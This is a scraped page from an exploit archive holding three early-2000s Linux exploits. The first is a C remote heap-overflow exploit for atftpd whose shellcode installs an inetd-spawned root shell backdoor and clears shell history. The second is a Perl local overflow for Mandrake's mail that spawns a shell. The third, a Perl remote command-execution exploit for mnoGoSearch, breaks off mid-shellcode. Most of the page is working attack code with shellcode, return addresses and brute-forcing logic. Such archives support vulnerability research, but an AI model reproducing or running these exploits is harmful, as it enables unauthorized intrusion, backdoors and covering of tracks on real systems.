DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDAtftpd 0.6 - 'atftpdx.c' Remote Command ExecutionEDB-ID:39CVE:2003-0380EDB Verified:Author:gunzipType:remoteExploit:/Platform:LinuxDate:2003-06-10Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**** PoC linux/86 remote exploit against atftpd (c) gunzip ( FIXED )*****/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <string.h>#include <netdb.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <signal.h>#define HEAP_START	0x080514b4#define HEAP_END	0x080594b4#define BACKDOOR	"rfe"	/* port MUST be > 1024 		*/#define NOPNUM		128	/* number of nops		*/#define PORT		69	/* tftpd port		*/#define	BUFSIZE		512	/* size of exploit buffer 	*/#define TIMEOUT		0x5	/* timeout in sec.		*/#define NOALARM		0x0	/* no timeout		*/#define	RRQ		0x1	/* request method		*/#define MODE		"octet"	/* request mode		*/#define OFFSET 		16000	/* distance of nops from heap	*/struct target {char * name ;unsigned int	align ;unsigned int	len ;unsigned int	retaddr ;} tg[] ={{ "Linux (Debian 3.0)",	0,	264, 	0x0805560c 	},{ NULL,			0, 	0, 	0 		}};char shellcode[]= /* taken from lsd-pl.net */"\xeb\x22"             /* jmp     <cmdshellcode+36>      */"\x59"                 /* popl    %ecx                   */"\x31\xc0"             /* xorl    %eax,%eax              */"\x50"                 /* pushl   %eax                   */"\x68""//sh"           /* pushl   $0x68732f2f            */"\x68""/bin"           /* pushl   $0x6e69622f            */"\x89\xe3"             /* movl    %esp,%ebx              */"\x50"                 /* pushl   %eax                   */"\x66\x68""-c"         /* pushw   $0x632d                */"\x89\xe7"             /* movl    %esp,%edi              */"\x50"                 /* pushl   %eax                   */"\x51"                 /* pushl   %ecx                   */"\x57"                 /* pushl   %edi                   */"\x53"                 /* pushl   %ebx                   */"\x89\xe1"             /* movl    %esp,%ecx              */"\x99"                 /* cdql                           */"\xb0\x0b"             /* movb    $0x0b,%al              */"\xcd\x80"             /* int     $0x80                  */"\xe8\xd9\xff\xff\xff" /* call    <cmdshellcode+2>       */"echo " BACKDOOR " stream tcp nowait nobody /bin/sh sh -i>/tmp/.x ;/usr/sbin/inetd /tmp/.x;";void timeout( int sig ){alarm( NOALARM );signal( SIGALRM, SIG_DFL );fprintf(stderr,"[-] Timeout.\n");exit( EXIT_FAILURE );}int shell( int fd ){int rd ;fd_set rfds;static char buff[ 1024 ];char INIT_CMD[] = "unset HISTFILE; rm -f /tmp/.x; echo; id; uname -a\n";write(fd, INIT_CMD, strlen( INIT_CMD ));while(1) {FD_ZERO( &rfds );FD_SET(0, &rfds);FD_SET(fd, &rfds);if(select(fd+1, &rfds, NULL, NULL, NULL) < 1) {perror("[-] Select");exit( EXIT_FAILURE );}if( FD_ISSET(0, &rfds) ) {if( (rd = read(0, buff, sizeof(buff))) < 1) {perror("[-] Read");exit( EXIT_FAILURE );}if( write(fd,buff,rd) != rd) {perror("[-] Write");exit( EXIT_FAILURE );}}if( FD_ISSET(fd, &rfds) ) {if( (rd = read(fd, buff, sizeof(buff))) < 1) {exit( EXIT_SUCCESS );}write(1, buff, rd);}}}int try( unsigned short bport, unsigned long ip  ){int                     sockfd ;struct sockaddr_in      sheep ;if ((sockfd = socket (AF_INET, SOCK_STREAM, 0)) == -1){perror("[-] Socket");exit( EXIT_FAILURE );}sheep.sin_family = AF_INET;sheep.sin_addr.s_addr = ip ;sheep.sin_port = htons ( bport );signal( SIGALRM, timeout );alarm( TIMEOUT );if ( connect(sockfd,(struct sockaddr *)&sheep,sizeof(sheep)) == -1 ){alarm( NOALARM );signal(SIGALRM,SIG_DFL);return 0;}alarm( NOALARM );signal(SIGALRM,SIG_DFL);return sockfd ;}char * xp_make_str( unsigned int len, unsigned int align, unsigned long retaddr ){int c ;char * 	xp = (char *)calloc( BUFSIZE, sizeof(char) );char * 	code = shellcode ;if( !xp ) {fprintf(stderr, "[-] Not enough memory !\n");exit( EXIT_FAILURE );}/* stupid check */if (( align + len ) > (BUFSIZE - strlen( shellcode ) - 32)) {fprintf(stderr, "[-] String too long or align too high.\n");exit( EXIT_FAILURE );}/** our buffer shoud look like this** [ NOPS ][ SHELLCODE ][ RETADDR * 4 ][ 0 ][ MODE ][ 0 ][ NOPS ][ SHELLCODE ]*                                    |_____> len*/memset ( xp, 0x41, BUFSIZE );memcpy( xp + len - strlen( code ) - 16, code, strlen( code ));for ( c = align + len - 16 ; c < len  ; c += 4 )*(long *)( xp + c ) = retaddr ;*( xp ) = 0x0 ;*( xp + 1 ) = RRQ ;*( xp + len )= '\0' ;memcpy( xp + len + 1, MODE, strlen( MODE ));*( xp + len + 1 + strlen( MODE )) = '\0' ;memcpy ( xp + BUFSIZE - strlen( code ), code, strlen( code ));return xp ;}void usage( char * a ){int o = 0 ;fprintf(stderr,"__Usage: %s -h host -t target [options]\n\n""-o\toffset\n""-a\talign\n""-s\tstep for bruteforcing (try 120 <= step <= 512)\n""-l\tlength of filename\n""-v\ttreceives packets too (check if daemon's crashed)\n""-b\tenables bruteforce (dangerous !)\n\n", a);while( tg[o].name != NULL ){fprintf(stderr, "\t%d - %s\n", o, tg[o].name ); o++ ;}fprintf( stderr, "\n" );exit( EXIT_FAILURE );}int main(int argc, char *argv[]){int 			sfd, t = 0, bport = 0, opt = 0, offset = 0,want_receive = 0, brute = 0, yeah = 0, step = 0;struct 	servent 	* se ;unsigned long		n ;char * 			host ;struct 	sockaddr_in 	server ;int 			len = sizeof(server);char * rbuf = (char *)calloc( BUFSIZE + 4, sizeof(char) );char * wbuf = (char *)calloc( BUFSIZE + 4, sizeof(char) );if ( !wbuf || !rbuf )  {fprintf(stderr, "[-] Not enough memory !\n");exit( EXIT_FAILURE );}memset(&server, 0, sizeof(server));fprintf(stderr,"\nlinux/x86 atftpd remote exploit by gunzip\n\n");if ( argc < 3 )usage( argv[0] );while ((opt = getopt(argc, argv, "bvo:a:l:h:t:s:")) != EOF) {switch(opt){case 's': step = atoi( optarg ); break ;case 'h': host = strdup ( optarg ); break;case 't': t = atoi(optarg); break;case 'b': brute++ ; break ;case 'v': want_receive++ ; break ;case 'o': offset += atoi( optarg ); break;case 'a': tg[t].align = atoi( optarg ); break;case 'l': tg[t].len = atoi( optarg ); break;default: usage( argv[0] ); break;}}if (( se = getservbyname( BACKDOOR, NULL )) == NULL ) {perror("[-] Getservbyname");exit( EXIT_FAILURE );}if ((bport = ntohs( se->s_port )) < 1024 ) {fprintf(stderr, "[-] Backdoor port must be <= 1024\n");exit( EXIT_FAILURE );}if ( inet_aton( host , &server.sin_addr) == 0 ) {struct hostent * he ;if ( (he = gethostbyname( host )) == NULL )  {perror("[-] Gethostbyname");exit( EXIT_FAILURE );}server.sin_addr.s_addr =((struct in_addr *)(he->h_addr))->s_addr ;}if ((sfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1 ) {perror("[-] Socket");exit( EXIT_FAILURE );}fprintf(stdout,"[+] Sending request to host %s\n",inet_ntoa(server.sin_addr));if ( !step ) step = tg[t].len / 2 ;if ( brute ) offset += OFFSET ;for( n = HEAP_START + offset; n < HEAP_END ; n += step ) {fprintf(stdout,"[+] Using len=%d align=%d retaddr=0x%.8x shellcode=%d bport=%d\n",tg[t].len, tg[t].align,(brute ) ? (unsigned int)n : (unsigned int)tg[t].retaddr + offset,strlen(shellcode), bport );if ( !brute )wbuf = xp_make_str( tg[t].len, tg[t].align, tg[t].retaddr + offset );elsewbuf = xp_make_str( tg[t].len, tg[t].align, n );server.sin_port = htons( PORT );if ( sendto(sfd, wbuf,(size_t) BUFSIZE, 0,(struct sockaddr *)&server,(socklen_t)sizeof(struct sockaddr)) < tg[t].len){perror("[-] Sendto");}else if ( want_receive ){signal( SIGALRM, timeout );alarm( TIMEOUT );if ( recvfrom(sfd, rbuf,(size_t) BUFSIZE, 0,(struct sockaddr *)&server,(socklen_t *)&len) != -1 ){alarm( NOALARM );signal( SIGALRM, SIG_DFL);fprintf( stdout,"[+] Received: %.2x %.2x %.2x %.2x\n",rbuf[0],rbuf[1],rbuf[2],rbuf[3]);}else {perror("[-] Recvfrom");}}sleep ( 1 ) ;if((yeah = try( bport, server.sin_addr.s_addr ))) {shell( yeah );exit( EXIT_SUCCESS );}if ( !brute ) break ;memset( wbuf, 0, BUFSIZE + 4 );memset( rbuf, 0, BUFSIZE + 4 );}return 1 ;}// milw0rm.com [2003-06-10]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 40
Mandrake Linux 8.2 - '/usr/mail' Local Overflow - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMandrake Linux 8.2 - '/usr/mail' Local OverflowEDB-ID:40CVE:EDB Verified:Author:anonymousType:localExploit:/Platform:LinuxDate:2003-06-10Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl################################ Mandrake 8.2 /usr/mail local exploit## Usage:# perl d86mail.pl [offset]# Then enter "." (dot) and press 'Enter'## Example:# [satan@localhost my]$ perl d86mail.pl# eip: 0xbffffddd# .[enter]# Cc: too long to edit# sh-2.05$###############################$shellcode ="\x31\xdb\x89\xd8\xb0\x17\xcd\x80" ."\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" ."\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" ."\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" ."\x80\xe8\xdc\xff\xff\xff/bin/sh";$size = 1000;$size2 = 8204;$retaddr = 0xbffffddd;$nop = "\x90";$offset = 0;if (@ARGV == 1) {$offset = $ARGV[0];}for ($i = 0; $i < ($size - length($shellcode) - 4); $i++) {$buffer .= $nop;}for ($i = 0; $i < ($size2); $i++) {$buffer2 .= "A";}$buffer .= $shellcode;print "eip: 0x", sprintf('%lx',($retaddr + $offset)), "\n";local($ENV{'EVILBUF'}) = $buffer;$newret = pack('l', ($retaddr + $offset));$buffer2 .= $newret;exec("mail -s wow -c $buffer2 root@localhost");#EOF# milw0rm.com [2003-06-10]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 41
mnoGoSearch 3.1.20 - Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDmnoGoSearch 3.1.20 - Remote Command ExecutionEDB-ID:41CVE:2003-0437EDB Verified:Author:pokleyzzType:remoteExploit:/Platform:LinuxDate:2003-06-10Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl## [ reloaded ]# Remote Exploit for mnoGoSearch 3.1.20 that performs# remote command execution as the webserver user id# for linux ix86# by pokleyzz#use IO::Socket;$host = "127.0.0.1";$cmd  = "ls -la";$searchpath = "/cgi-bin/search.cgi";$rawret = 0xbfff105c;$ret = "";$suffsize = 0;$port = 80;my $conn;if ($ARGV[0]){$host = $ARGV[0];}else {print "[x] mnogosearch 3.1.x exploit for linux ix86 \n\tby pokleyzz\n\n";print "Usage:\n mencari_sebuah_nama.pl host [command] [path] [port] [suff] [ret]\n";print "\thost\thostname to exploit\n";print "\tcommand\tcommand to execute on server\n";print "\tpath\tpath to search.cgi default /cgi-bin/search.cgi\n";print "\tport\tport to connect to\n";print "\tsuff\tif not success try to use 1, 2 or 3 for suff (default is 0)\n";print "\tret\treturn address default bfffd0d0\n";exit;}if ($ARGV[1]){$cmd = $ARGV[1];}if ($ARGV[2]){$searchpath = $ARGV[2];}if ($ARGV[3]){$port = int($ARGV[3]);}if ($ARGV[4]){$suffsize = int($ARGV[4]);}if ($ARGV[5]){$rawret = hex_to_int($ARGV[5]);}#########~~ start function ~~#########sub hex_to_int {my $hs = $_[0];$int = (hex(substr($hs, 0, 2)) << 24) + (hex(substr($hs, 2, 2)) << 16) +(hex(substr($hs, 4, 2)) << 8) + + hex(substr($hs, 6, 2));}sub int_to_hex {my $in = $_[0];$hex = sprintf "%x",$in;}sub string_to_ret {my $rawret = $_[0];if (length($rawret) != 8){print $rawret;die "[*] incorrect return address ...\n ";} else {$ret = chr(hex(substr($rawret, 2, 2)));$ret .= chr(hex(substr($rawret, 0, 2)));$ret .= chr(hex(substr($rawret, 6, 2)));$ret .= chr(hex(substr($rawret, 4, 2)));}}sub connect_to {#print "[x] Connect to $host on port $port ...\n";$conn = IO::Socket::INET->new (Proto => "tcp",PeerAddr => "$host",PeerPort => "$port",) or die "[*] Can't connect to $host on port $port ...\n";$conn-> autoflush(1);}sub check_version {my $result;connect_to();print "[x] Check if $host use correct version ...\n";print $conn "GET $searchpath?tmplt=/test/testing123 HTTP/1.1\nHost: $host\nConnection: Close\n\n";# capture resultwhile ($line = <$conn>) {$result .= $line;};close $conn;if ($result =~ /_test_/){print "[x] Correct version detected .. possibly vulnerable ...\n";} else {print $result;die "[x] New version or wrong url\n";}}sub exploit {my $rw = $_[0];$result = "";# linux ix86 shellcode rip from phx.c by proton$shellcode = 